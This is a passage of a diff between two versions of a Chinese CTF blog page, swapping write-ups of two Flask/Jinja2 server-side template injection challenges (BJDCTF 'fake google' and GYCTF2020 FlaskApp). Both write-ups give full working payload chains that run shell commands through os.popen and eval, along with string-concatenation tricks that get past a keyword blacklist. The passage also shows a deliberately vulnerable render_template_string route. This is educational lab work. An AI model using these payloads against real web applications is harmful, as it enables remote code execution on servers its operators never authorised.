-<h3 id="_8"><a class="toclink" href="bjdctf2-fake-google-ssti/#_8">路线二：从框架给的钩子走（快）</a></h3>
-<p><strong>既然确认了是 Flask，就先看看模板里现成给了什么：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
-</span></code></pre></div>
-<p><img alt="url_for" src="../assets/images/bjdctf2-fake-google/03-url-for.png" /></p>
-<p><strong>它是函数——函数身上就有 <code>__globals__</code>。所以不需要爬几百个子类：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>{{url_for.__globals__}}                  →  一大坨 dict
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>{{(url_for.__globals__)['os']}}          →  &lt;module 'os' ...&gt;
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
-</span></code></pre></div>
-<p><strong>三行就出 flag。</strong></p>
-<p><strong>这就是两条路的区别：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>路线一（长）：'' → 类 → 父类 → 所有子类 → 挑一个 → __globals__ → 执行
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>路线二（短）：url_for → __globals__ → os → 执行
-</span></code></pre></div>
-<p><strong>路线二快，但依赖 Flask 注入了 <code>url_for</code>；路线一慢，但只要是 Python 就通。实战里先试短的，不通再走长的。</strong></p>
-<hr />
-<h3 id="_9"><a class="toclink" href="bjdctf2-fake-google-ssti/#_9">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>一个输入框 → 试 SQL 注入，内容被原样打印
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  → 看源码，qaq 里有提示 sssssti
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    → {{7*7}} = 49        确认模板被执行
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      → {{7*'7'}} = 7777777  确认是 Jinja2
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        → {{config}}        确认是 Flask
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>          ├─ 路线一：'' → __class__ → __bases__[0] → __subclasses__()
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>          │           → 挑 _wrap_close(117) / catch_warnings(169)
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>          │             → __init__.__globals__ → popen / __builtins__ → 执行
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>          └─ 路线二：url_for → __globals__ → ['os'] → popen → 执行
-</span></code></pre></div>
-<h4 id="_10"><a class="toclink" href="bjdctf2-fake-google-ssti/#_10">漏洞原理</a></h4>
-<p><strong>① Jinja2 的 <code>{{ }}</code> 里是表达式，会被求值</strong></p>
-<p><strong>用户输入被拼进模板字符串后，<code>{{ }}</code> 里的内容不再当文字，而是交给 Python 求值。这是 SSTI 成立的第一步。</strong></p>
-<p><strong>② Python 的属性访问没有边界</strong></p>
-<p><strong>从任何一个对象出发，都能顺着 <code>__class__</code>（类）→ <code>__mro__</code> / <code>__bases__</code>（父类）→ <code>__subclasses__()</code>（所有子类）→ <code>__init__.__globals__</code>（定义时的模块空间）走到执行。这不是漏洞，是语言特性；漏洞在于</strong>模板允许你访问这些属性<strong>。</strong></p>
-<p><strong>③ 框架注入的全局变量是“现成的入口”</strong></p>
-<p><strong>Flask 会把 <code>config</code>、<code>request</code>、<code>session</code>、<code>url_for</code>、<code>lipsum</code>、<code>get_flashed_messages</code> 放进模板名字空间。它们本身是函数或对象，身上挂着 <code>__globals__</code>，等于给了一条捷径。</strong></p>
-<h4 id="_11"><a class="toclink" href="bjdctf2-fake-google-ssti/#_11">关键知识点</a></h4>
+<p><strong>过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。</strong></p>
+<p><strong>③ 长链和短链的区别只在入口</strong></p>
+<p>短链从<strong>框架注入的名字</strong>（<code>url_for</code>）出发，长链从<strong>字面量</strong>（<code>''</code>）出发。终点一样，都是拿到 <code>__builtins__</code>。</p>
+<h4 id="_5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_5">关键知识点</a></h4>
 <table>
 <thead>
 <tr>
@@ -3331,70 +3646,70 @@
 </thead>
 <tbody>
 <tr>
-<td><code>{{7*7}}</code> / <code>{{7*'7'}}</code></td>
-<td>引擎探测：回显 49 / 7777777 说明是 Jinja2</td>
+<td>黑名单（本题）</td>
+<td><code>*</code> <code>eval</code> <code>os</code> <code>popen</code> <code>system</code> <code>import</code> <code>request</code> <code>subprocess</code> <code>flag</code>，子串匹配</td>
 </tr>
 <tr>
-<td><code>{{config}}</code></td>
-<td>Flask 的模板全局，能确认框架、有时能读到 SECRET_KEY</td>
+<td><code>+</code> 拼接</td>
+<td><code>'o'+'s'</code> 绕 <code>os</code>；<code>'this_is_the_fl'+'ag.txt'</code> 绕 <code>flag</code></td>
 </tr>
 <tr>
-<td><code>__class__</code></td>
-<td>任何对象都能拿到它的类</td>
+<td>子串陷阱</td>
+<td><code>host</code> 里含 <code>os</code> 也会被拦——拆词时每一段都要检查</td>
 </tr>
 <tr>
-<td><code>__base__</code> vs <code>__bases__</code></td>
-<td>前者是单个父类（不可下标），后者是元组（可 <code>[0]</code>）</td>
+<td>POST-Redirect-GET</td>
+<td>结果存 session，302 的响应体里没有结果</td>
 </tr>
 <tr>
-<td><code>__subclasses__()</code></td>
-<td>内存里所有已加载的类，但<strong>下标因环境而异</strong></td>
+<td>结果越长 cookie 越大</td>
+<td>因为结果被塞进了 session</td>
 </tr>
 <tr>
-<td><code>__globals__</code></td>
-<td>函数定义时所在的模块全局空间（只有 Python 层函数有，C 层 wrapper 没有）</td>
+<td><code>\|selectattr</code></td>
+<td>按属性名筛，代替"数下标"跨环境稳定</td>
 </tr>
 <tr>
-<td><code>__builtins__</code></td>
-<td>里面有 <code>__import__</code>，能 import 就能拿任何模块</td>
+<td><code>'__name__'</code> vs <code>'name'</code></td>
+<td>前者才有值，后者筛不出东西</td>
 </tr>
 <tr>
-<td>点号 vs 方括号</td>
-<td><code>.</code> 取属性，<code>['x']</code> 取键，不能写成 <code>.['x']</code></td>
+<td><code>'equalto'</code> 要加引号</td>
+<td>不加时报 <code>no test named Undefined</code></td>
 </tr>
 <tr>
-<td>生成器</td>
-<td><code>map</code> / <code>selectattr</code> 返回惰性生成器，要 <code>\|first</code> 或 <code>\|list</code> 才有值</td>
+<td>双层拆分</td>
+<td><code>eval</code> 那条：Jinja 层拆一次，Python 源码再拆一次</td>
 </tr>
 <tr>
-<td>按名字筛代替下标</td>
-<td><code>\|selectattr('__name__','equalto','xxx')\|first</code>，跨环境稳定</td>
-</tr>
-<tr>
-<td>遇到过滤 <code>.__globals__</code></td>
-<td>用 <code>\|attr('__globals__')</code> 换形状（本题没有过滤，用不上）</td>
+<td><code>open</code> vs <code>eval</code></td>
+<td><code>open</code> 只读文件，不碰 shell，名单里也没它——比 <code>eval</code> 省事</td>
 </tr>
 </tbody>
 </table>
 <hr />
 <details class="note">
-<summary>两条链的完整 payload（本题实测）</summary>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x"># 路线一 · _wrap_close：globals 里直接有 popen</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">117</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'popen'</span><span class="o">](</span><span class="s1">'cat /flag'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="x"># 路线一 · catch_warnings：走 __builtins__ → __import__</span>
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">169</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eval'</span><span class="o">](</span><span class="s2">"__import__('os').popen('cat /f*').read()"</span><span class="o">)</span><span class="cp">}}</span>
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="x"># 路线二 · url_for 短路</span>
-</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="cp">{{</span><span class="o">(</span><span class="nv">url_for.__globals__</span><span class="o">)[</span><span class="s1">'os'</span><span class="o">]</span><span class="nv">.popen</span><span class="o">(</span><span class="s1">'cat /f*'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+<summary>两条链的完整 payload（实测）</summary>
+<p><strong>短路（<code>url_for</code>）</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'ls /'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
 </span></code></pre></div>
+<p><strong>长链（<code>subclasses</code> + <code>eval</code>，双层拆分）</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("ls /").read()'</span><span class="o">)</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>长链（<code>subclasses</code> + <code>open</code>，只有一层拆分，更省事）</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'/this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>注意：<code>open</code> 版必须先知道文件名（靠 <code>ls /</code>），而且不能执行命令，只能读文件。</strong></p>
 </details>
+<hr />
 <details class="note">
-<summary>跨环境更稳的写法：按名字找，不记下标</summary>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="s1">'__init__'</span><span class="o">)</span><span class="nv">.__globals__</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong><code>selectattr</code> 按属性名筛，<code>\first</code> 取第一个 —— 不需要知道它在第几个。</strong>
-<strong>如果连 <code>.__globals__</code> 这种形状都被过滤，就换成 <code>|attr('__globals__')</code>。</strong></p>
+<summary>两道黑名单自查（我踩过的）</summary>
+<p><strong>① 以为 <code>url_for.__globals__</code> 被拦了</strong></p>
+<p>其实是 302 重定向，响应体里本来就没有结果。<strong>先分清"没执行"和"结果在下一页"。</strong></p>
+<p><strong>② <code>eval</code> 那条报 <code>nonono</code>，找不到是哪个词</strong></p>
+<p><strong>逐个测试是最快的办法</strong>：把可疑的词单独包成 <code>{{'xxx'}}</code> 发一遍，看哪个返回 <code>nonono</code>。</p>
+<p>我拆了 <code>import</code>、<code>popen</code>、<code>eval</code>，就是没拆 <code>"os"</code>。</p>
 </details>
     
     
@@ -3407,7 +3722,7 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
-          <time datetime="2026-11-01 00:00:00+00:00">2026-11-01</time></li>
+          <time datetime="2026-11-01 17:10:00+00:00">2026-11-01</time></li>
         
           <li class="md-meta__item">
             分类于
@@ -3611,7 +3926,7 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
-          <time datetime="2026-11-01 00:00:00+00:00">2026-11-01</time></li>
+          <time datetime="2026-11-01 15:20:00+00:00">2026-11-01</time></li>
         
           <li class="md-meta__item">
             分类于
@@ -3910,14 +4225,14 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
-          <time datetime="2026-11-01 00:00:00+00:00">2026-11-01</time></li>
+          <time datetime="2026-11-01 11:00:00+00:00">2026-11-01</time></li>
         
           <li class="md-meta__item">
             分类于
             
               <a href="category/python/" class="md-meta__link">Python</a>, 
-              <a href="category/flask/" class="md-meta__link">Flask</a>, 
-              <a href="category/ssti/" class="md-meta__link">SSTI</a></li>
+              <a href="category/ssti/" class="md-meta__link">SSTI</a>, 
+              <a href="category/flask/" class="md-meta__link">Flask</a></li>
         
         
           
@@ -3933,121 +4248,110 @@
     </div>
   </header>
   <div class="md-post__content md-typeset">
-    <h2 id="gyctf2020-flaskapp"><a class="toclink" href="gyctf2020-flaskapp-ssti/">[GYCTF2020] FlaskApp — 一张黑名单，两条链</a></h2>
+    <h2 id="bjdctf-2nd-fake-google-ssti"><a class="toclink" href="bjdctf2-fake-google-ssti/">[BJDCTF 2<sup>nd</sup>] fake google — 我的第一道 SSTI</a></h2>
 <blockquote>
-<p><strong>题目类型</strong>：Web — Flask SSTI（有过滤）</p>
+<p><strong>题目类型</strong>：Web — Flask / Jinja2 模板注入（SSTI）</p>
 <p><strong>题目地址</strong>：BUUCTF / ctf2 复刻环境</p>
-<p><strong>Flag</strong>：<code>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}</code></p>
+<p><strong>Flag</strong>：<code>CTF2{4ba1fadc-b09a-441d-baf8-191ea2b8a4dd}</code></p>
 </blockquote>
 <hr />
-<h3 id="_1"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_1">题目概述</a></h3>
-<p>进入靶场发现是一个加解密的方式，先随便加密解密试试。</p>
-<p>这里发现，<strong>解密时会把解密的内容打印出来</strong>——那就有戏了。</p>
+<h3 id="_1"><a class="toclink" href="bjdctf2-fake-google-ssti/#_1">题目概述</a></h3>
+<p>进入界面只有一个输入框。</p>
+<p><strong>先试 SQL 注入，发现无论输入什么，它都直接打印出来——不像是在查数据库。</strong></p>
+<p><strong>查看源码，在 <code>qaq</code> 那个位置发现了提示：<code>sssssti &amp; a little trick</code>。这就是 SSTI，模板注入。</strong></p>
+<p><strong>这是我第一次做 SSTI，所以每一步都写下来了。</strong></p>
 <hr />
-<h3 id="_2"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_2">解题过程</a></h3>
-<h4 id="step-177-nonono"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-177-nonono">Step 1：<code>{{7*7}}</code> 返回 <code>nonono</code></a></h4>
-<p>先试一下 <code>{{7*7}}</code>，返回的是 <code>nonono</code>。</p>
-<p><strong>这个 <code>nonono</code> 就明确了我们的思路是对的，只不过有东西被过滤了。</strong></p>
-<p>接着我去试，发现被过滤的有这些：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>*  eval  os  subprocess  popen  import  system  request  flag
+<h3 id="_2"><a class="toclink" href="bjdctf2-fake-google-ssti/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="bjdctf2-fake-google-ssti/#step-1">Step 1：确认模板被执行</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>{{7*7}}   →  49
 </span></code></pre></div>
-<p><strong>（是子串匹配、不分大小写。所以 <code>host</code> 这种词也会中招 —— 里面含 <code>os</code>。）</strong></p>
-<p><strong>能过的是：</strong><code>config</code> <code>self</code> <code>session</code> <code>url_for</code> <code>lipsum</code> <code>globals</code> <code>builtins</code> <code>class</code> <code>open</code> <code>cat</code> <code>read</code> <code>+</code></p>
-<p><strong>注意 <code>+</code> 没被过滤</strong>，所以后面全靠拼接绕过。</p>
-<h4 id="step-2-flask"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-2-flask">Step 2：确认是 Flask，先试短路</a></h4>
-<p>试试 <code>{{config}}</code>，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。</p>
-<p>那先试试 <code>url_for</code> 能不能正常使用，结论是可行的：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
+<p><strong>如果回显的是 <code>{{7*7}}</code> 原文，说明只是字符串拼接；回显 49，说明你的输入进了模板引擎，被真的求值了。</strong></p>
+<h4 id="step-2-jinja2"><a class="toclink" href="bjdctf2-fake-google-ssti/#step-2-jinja2">Step 2：确认是 Jinja2</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>{{7*'7'}}  →  7777777
 </span></code></pre></div>
-<h4 id="step-3-net"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-3-net">Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向</a></h4>
-<p>接着再试 <code>{{url_for.__globals__}}</code>，<strong>但是页面没有回显</strong>，看了一下 Net 发现被重定向了。</p>
-<p><strong>这里我实在不明白原因。</strong>BP 抓包抓下来的响应里，session 里有一大串数据，但是解码不出来。</p>
-<blockquote>
-<p><strong>后来搞明白了，记在这里：</strong></p>
-<p>这题用的是 <strong>POST-Redirect-GET</strong> 模式：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">():</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'GET'</span><span class="p">:</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'res'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'decode.html'</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="p">)</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'res'</span><span class="p">]</span> <span class="o">=</span> <span class="n">res</span>          <span class="c1"># 结果塞进 session（flash）</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">)</span>    <span class="c1"># 302</span>
+<p><img alt="Jinja2 确认" src="../assets/images/bjdctf2-fake-google/01-jinja2-7777777.png" /></p>
+<p><strong>这个探针是用来区分引擎的：Jinja2 里 <code>'7'</code> 是字符串，重复 7 次得到 <code>7777777</code>；Twig（PHP）里会当成数字，得到 49。</strong></p>
+<h4 id="step-3-flask"><a class="toclink" href="bjdctf2-fake-google-ssti/#step-3-flask">Step 3：确认是 Flask</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>{{config}}   →  Flask 的配置对象
 </span></code></pre></div>
-<p><strong>所以：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>③ 结果越长，cookie 越大
-</span></code></pre></div>
-<p><strong>我看到的"没回显"，其实是在看 302 的响应体（内容是 <code>Redirecting...</code>）。</strong>跟过滤无关，是流程问题。</p>
-</blockquote>
-<h4 id="step-4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-4">Step 4：短路打通</a></h4>
-<p><code>url_for.__globals__</code> 本身是通的，卡住的是<strong>再往下取 <code>['os']</code></strong> —— 因为 <code>os</code> 在名单里。</p>
-<p><strong>但 <code>+</code> 没被过滤，所以可以拼：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{{url_for.__globals__['o'+'s']}}
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>→  &lt;module 'os' from '/usr/local/lib/python3.7/os.py'&gt;
-</span></code></pre></div>
-<p>这个又能正常回显了。</p>
-<h4 id="step-5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-5">Step 5：先找文件名</a></h4>
-<p><code>popen</code> 被拦，所以也拼一下；然后<strong>先 <code>ls /</code></strong>，因为我们还不知道 flag 叫什么：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
-</span></code></pre></div>
-<p><strong>根目录下有个 <code>this_is_the_flag.txt</code>。文件名是这一步才知道的。</strong></p>
-<h4 id="step-6"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-6">Step 6：读出来</a></h4>
-<p>注意 <code>flag</code> 这个词也被拦，所以路径也要拼（<code>'this_is_the_fl'</code> + <code>'ag.txt'</code>）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
-</span></code></pre></div>
-<h4 id="step-7"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-7">Step 7：换一条路（长链）</a></h4>
-<p>短路能通，是因为 Flask 注入了 <code>url_for</code>。<strong>换个环境把 <code>url_for</code> 删了，这条路就断。</strong>所以再走一遍长链——从字面量 <code>''</code> 开始爬。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>→  &lt;class '_py_warnings.catch_warnings'&gt;
-</span></code></pre></div>
-<p><strong>（<code>__name__</code> 是四个下划线；<code>name</code> 不出东西。另外 <code>equalto</code> 要加引号，不加会报 <code>no test named Undefined</code>。）</strong></p>
-<p>然后接 <code>['__init__']['__globals__']['__builtins__']</code>，拿到 builtins 的 dict。</p>
-<p><strong>接下来我一开始想用 <code>eval</code>，直接给出去的版本报了 <code>nonono</code>，我不知道是哪个还被过滤了。</strong></p>
-<blockquote>
-<p><strong>答案：是 <code>"os"</code>。</strong></p>
-<p>我把 <code>import</code> 拆了、<code>popen</code> 拆了、<code>eval</code> 拆了，<strong>唯独把 <code>"os"</code> 原样写在了字符串里</strong> —— 那两个字面量照样会被匹配。</p>
-<p>拆开之后：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
-</span></code></pre></div>
-</blockquote>
-<p><strong>完整的一条：</strong></p>
